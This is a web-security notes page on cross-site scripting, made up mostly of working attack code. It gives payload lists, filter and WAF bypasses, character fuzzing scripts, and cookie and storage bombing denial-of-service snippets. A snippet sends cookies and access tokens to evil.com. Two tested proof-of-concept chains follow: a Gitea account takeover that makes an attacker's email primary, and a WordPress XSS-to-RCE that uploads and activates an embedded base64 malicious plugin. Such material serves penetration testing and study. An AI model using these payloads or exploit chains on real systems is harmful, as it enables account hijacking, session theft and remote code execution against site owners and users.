---
title: "XSS - Cross-site Scripting"
description: "Overview of Cross-Site Scripting"
lead: "Overview of Cross-Site Scripting"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "client-side"
weight: 620
toc: true
---

## Definition

**Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious scripts into webpages viewed by other users.

## Basic payloads

- [Cross-site scripting (XSS) cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet): List of XSS payloads.

```html
<script>alert()</script>
<img src=x onerror=alert()>
<svg onload=alert()>

<!-- Run debugger -->
<img src=x onerror=debugger>

<!-- Data exfiltration -->
<script>
document.location='//evil.com?c='.concat(document.cookie);
document.location='//evil.com?t='.concat(localStorage.getItem('access_token'));
</script>
```

## Filter/WAF Bypass

- HTML entity list: [Named character references](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references)

### Basic filter bypass

```html
<!-- Alternate case -->
<sCrIpt>alert()</ScRipt>
<!-- No quotes -->
alert(String.fromCharCode(88,83,83))
alert(/XSS/.source)
eval(atob(`YWxlcnQoKQ`))
<!-- No parenthesis -->
alert`1`
<!-- Alternate calls -->
["XSS"].map(alert)
\u0061\u006C\u0065\u0072\u0074("XSS")
```

### Variable self

Call a function using `self["<func_name>"]()`:

```html
self[location.hash.substr(1,)]("XSS") <!-- Append #alert to our URL -->
self[Object.keys(self)[5]]("XSS")

> Object.keys(self)
>>> Array(316) [ "close", "stop", "focus", "blur", "open", "alert", "confirm", "prompt", "print", "postMessage", … ]
```

### innerHTML vs innerText

```html
<head>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.6/purify.min.js"></script>
</head>
<body>
	<p id="input">&lt;img src=x onerror=alert() /&gt;</p>
	<p id="tmp"></p>
	<p id="output"></p>

	<script>
		console.log(input.innerText); // <img src=x onerror="alert()" />
		console.log(input.innerHTML); // &lt;img src=x onerror="alert()" /&gt;
		let clean = DOMPurify.sanitize(input.innerHTML);
		tmp.innerHTML = clean; // No XSS
		output.innerHTML = tmp.innerText; // XSS here
	</script>
</body>
```

### HTML parser fuzzing

```html
<img src=x onerrorFUZZ="alert()" />
=> FUZZ: 9, 10, 12, 13, 32 (respectively \t, \n, \0xC, \r, space)
```

{{< details "HTML parser fuzzing" >}}
```js
var i = 0;
function fuzz() {
    console.log("Testing " + i + "...");
    document.body.innerHTML = `<img src=x onerror${String.fromCharCode(i)}="alert(${i})" />`;
    i += 1;
    setTimeout(fuzz, 500);
}
fuzz();
```
{{< /details >}}

### Anchors fuzzing

#### Javascript protocol

```js
FUZZjavascript:alert()
=> FUZZ: 0x0 to 0x1F (containing \t, \n, \r and space)

javascriptFUZZ:alert()
=> FUZZ: 9, 10, 13, 58 (respectively \t, \n, \r, :)

javaFUZZscript:alert()
=> FUZZ: 9, 10, 13 (respectively \t, \n, \r)

&#FUZZ;javascript:alert()
=> FUZZ: 0x1 to 0x1F (containing \t, \n, \r and space)
```

{{< details "Multiple characters" >}}
Note that you can use multiple characters:

```html
<a href="java


script:alert()">link</a>
<a href="			javascript:alert()">link2</a>
```
{{< /details >}}

{{< details "JavaScript Fuzzing script" >}}
```html
<body><script>
let valids = [];
for (let i = 0; i <= 0x10FFFF; i++) {
	document.body.innerHTML = `<a href="&#${i};javascript:void(0)"></a>`;
	let anchor = document.body.firstChild;
	if (anchor.protocol == "javascript:")
		valids.push(i);
}
console.log(valids);
</script></body>
```

> Inspired by the book *Javascript for hackers - Gareth Heyes*.
{{< /details >}}

#### URLs

```js
FUZZhttps://xanhacks.xyz
=> FUZZ: 0x1 to 0x1F (containing \t, \n, \r and space)

https:/FUZZ/xanhacks.xyz
=> FUZZ: 9, 10, 13, 47, 92 (respectively \t, \n, \r, /, \)

/FUZZ/xanhacks.xyz
=> FUZZ: 9, 10, 13 (respectively \t, \n, \r) - Chrome based
=> FUZZ: Nothing - Firefox

https://FUZZxanhacks.xyz
=> FUZZ: 9, 10, 13, 47, 64, 92, 173, 847, 6155, 6156, ... a lot
```

> Note: `<a href="https://///////xanhacks.xyz">link</a>` goes to `https://xanhacks.xyz`.

{{< details "URLs Fuzzing script" >}}
```html
<body><script>
let valids = [];
for (let i = 0; i <= 0x10FFFF; i++) {
	document.body.innerHTML = `<a href="${String.fromCodePoint(i)}https://xanhacks.xyz"></a>`;
	let anchor = document.body.firstChild;
	if (anchor.hostname == "xanhacks.xyz")
		valids.push(i);
}
console.log(valids);
</script></body>
```

> Inspired by the book *Javascript for hackers - Gareth Heyes*.
{{< /details >}}

## DOS

### Cookie bombing

Servers often block users that send requests with very large headers (e.g. 8K or 16K bytes).

- [431 - Request Header Fields Too Large](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431): when the total size of request headers is too large, or when a single header field is too large. Not to be confused with [414 - URI too long](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/414).

```js
const value = "a".repeat(4080);
document.cookie = "";

for (let i = 0; i < 100; i++) {
    let name = "a" + i;
    document.cookie = `${name}=${value}; path=/; domain=.example.com`;
}
```

{{< details "Nginx - large_client_header_buffers" >}}
> Syntax: 	large_client_header_buffers number size;<br>
> Default: 	large_client_header_buffers 4 8k;

- [large\_client\_header\_buffers](http://nginx.org/en/docs/http/ngx_http_core_module.html#large_client_header_buffers): Sets the maximum number and size of buffers used for reading large client request header. **By default, the buffer size is equal to 8K bytes**.
- A request header field cannot exceed the size of one buffer as well, or the 400 (Bad Request) error is returned to the client.
{{< /details >}}

{{< details "Apache - LimitRequestFieldSize" >}}
> Syntax: LimitRequestFieldSize bytes<br>
> Default: LimitRequestFieldSize 8190

- [LimitRequestFieldSize](https://httpd.apache.org/docs/current/mod/core.html#limitrequestfieldsize): specifies the number of bytes that will be allowed in an HTTP request header.
{{< /details >}}

{{< details "NodeJS - http.maxHeaderSize" >}}
- [http.maxHeaderSize](https://nodejs.org/api/http.html#httpmaxheadersize): Read-only property specifying the maximum allowed size of HTTP headers in bytes. **Defaults to 16384 (16 KiB)**.
- Configurable using the CLI option `--max-http-header-size=size` or inside [`http.request(url[, options][, callback])`](https://nodejs.org/api/http.html#httprequesturl-options-callback)
{{< /details >}}

### Local/Session Storage bombing

Local/Session storage have a size limit which depends on the web browser.

- `localStorage` and `sessionStorage` both use the [Storage interface](https://html.spec.whatwg.org/#the-storage-interface).
- The Storage interface throws a [QuotaExceededError](https://webidl.spec.whatwg.org/#dom-domexception-quota_exceeded_err) ([DOMException](https://webidl.spec.whatwg.org/#idl-DOMException)) if the quota has been exceeded.
```js
const value = "a".repeat(4080);
localStorage.clear();
sessionStorage.clear();

for (let i = 0; i < 100; i++) {
    let name = "a" + i;
    localStorage.setItem(name, value);
    sessionStorage.setItem(name, value);
}
```

- [Test of localStorage limits/quota](https://arty.name/localstorage.html): Test the limit of your browser.

{{< details "Limit - Numbers of characters" >}}
- Chrome 6.0.472.36 beta: 2600-2700k
- Firefox 3.6.8: 5200-5300k
- Explorer 8: 4900-5000k
- Opera 10.70 build 9013 popped a dialog, that allowed me to give the script unlimited storage.
{{< /details >}}

## Self XSS

- Trigger self-XSS using CSRF.
- Force the victim to use the cookie of an infected account. You can also set the cookie's path to the vulnerable endpoint of the self-XSS to gain unauthorized access to the victim's account on other paths.

## Account Takeover

### Gitea - Change primary email

{{< details "Proof of Concept" >}}
Tested on **Gitea Version 1.19.0** (2023-04-25)

Before running the PoC:
![Before Gitea ATO](https://i.imgur.com/eYL86BI.png)

After running the PoC:
![After Gitea ATO](https://i.imgur.com/022HvKl.png)

Proof of Concept code:
```js
const attacker_email = "evil@yopmail.com";

// 1) Obtain CSRF token
fetch("/user/settings/account").then(res => res.text()).then(data => {
    let csrfToken = data.match(/csrfToken: '([a-zA-Z0-9_-]+)',/).at(-1);
    // 2) Add secondary email address
    fetch("/user/settings/account/email", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `_csrf=${csrfToken}&email=${attacker_email}`
    })
    .then(res => res.text()).then(data => {
        // 3) Obtain CSRF token & email ID
        fetch("/user/settings/account").then(res => res.text()).then(data => {
            let csrfToken = data.match(/csrfToken: '([a-zA-Z0-9_-]+)',/).at(-1);
            let email_id = "";

            const htmlDoc = new DOMParser().parseFromString(data, "text/html");
            const emailStrong = htmlDoc.getElementsByClassName("ui email list")[0].getElementsByTagName("strong");
            for (let i = 0; i < emailStrong.length; i++) {
              if (emailStrong[i].innerText == attacker_email) {
                email_id = emailStrong[i].parentNode.parentNode.getElementsByClassName("button delete-button")[0].getAttribute("data-id");
                break;
              }
            }
            // 4) Set the email to primary address
            fetch("/user/settings/account/email", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: `_csrf=${csrfToken}&_method=PRIMARY&id=${email_id}`
            });
        });
    })
})
```
{{< /details >}}

## XSS to RCE

### Wordpress - Upload plugin form

{{< details "Proof of Concept" >}}
Tested on **Wordpress Version 6.2** (2023-04-28)<br>
*Admin privileges are required.*

Executing the PoC:
![Executing the PoC](https://i.imgur.com/KX72mGr.png)

Wordpress plugins list:
![Wordpress plugins list](https://i.imgur.com/UBSI1c5.png)

> The wordpress plugin can be found on [Github](https://github.com/xanhacks/wordpress-rce-plugin/).

RCE on every page:
![RCE on every page](https://i.imgur.com/Az1bdh3.png)

Proof of Concept code:
```js
// 1. Obtain CSRF token
fetch("/wp-admin/plugin-install.php")
.then(resp => resp.text())
.then(htmlResponse => {
	const htmlDoc = new DOMParser().parseFromString(htmlResponse, "text/html");
	const csrfToken = htmlDoc.getElementsByClassName("wp-upload-form")[0].getElementsByTagName("input")[0].value;

	// 2. Transform plugin (base64) into blob
	const b64_plugin_data = "UEsDBBQAAAAIAGdanFYSKsI7lwEAAHMDAAAJABwAaW5kZXgucGhwVVQJAAOSj0tkwY9LZHV4CwABBOkDAAAE6QMAAJ1Sy27bMBA8V1+xEHqwHUt0nSKHNEBfMdwAQeI6j0sRCGuKkYRYJEFSkY2g/16SkmIZyaEwT4udnZnVjs6+ylwGZDQKYATLnzNADQg3TD0XlIFtuv43ifQJMwYAirIIdYSRbkY8jJXJhbIobJDndlb79triXDvWfHEZTePJUdvmT+BfbozUp4RkhcmrVUxFSToBUguVSsW0jpylXFdZwT2dCrlVRZYbmE6mx+O+pcd3xB1p4Su4wpKdNtZvvrU3dre86KYOWvGcaaoKaQrBO53rlUGrjNz72oo9M7WFVwWQ9ryxI98zpXtE9z7Fk3jisO/+zn1o7+AN/L/rO8Yt2xg4F6XdraO8F/BlE2TfuJ9oC/eNna+1res6zngVC5WR9m/QJJNrR43NxvhreXtYoMk7Nlkjzyp7Eb/kvDC/qtVeOIek0sr8UMhp6+SMLUSCANM0QeoSG4S1TB6FMEyFYwibKrFS4fBLEDxW3E/Brj8YwkvwQW+1YeVghZqdfE5SRkXKBh+T5ez33ezm9k9IyzR8GFqJv8E/UEsBAh4DFAAAAAgAZ1qcVhIqwjuXAQAAcwMAAAkAGAAAAAAAAQAAAKSBAAAAAGluZGV4LnBocFVUBQADko9LZHV4CwABBOkDAAAE6QMAAFBLBQYAAAAAAQABAE8AAADaAQAAAAA=";
	fetch("data:application/zip;base64," + b64_plugin_data)
	.then(res => res.blob())
	.then(pluginBlob => {
		const formData = new FormData();
		formData.append("_wpnonce", csrfToken);
		formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
		formData.append("pluginzip", pluginBlob, "plugin.zip");
		formData.append("install-plugin-submit", "Install Now");

		// 3. Upload the malicious plugin
		fetch("/wp-admin/update.php?action=upload-plugin", {
			"method": "POST",
			"body": formData
		})
		.then(resp => resp.text())
		.then(htmlResponse => {
			const htmlDoc2 = new DOMParser().parseFromString(htmlResponse, "text/html");
			const link = htmlDoc2.getElementsByClassName("button button-primary")[0].getAttribute("href");

			// 4. Activate the plugin
			fetch("/wp-admin/" + link);
		});
	});
});
```
{{< /details >}}

Todo:
- Drupal
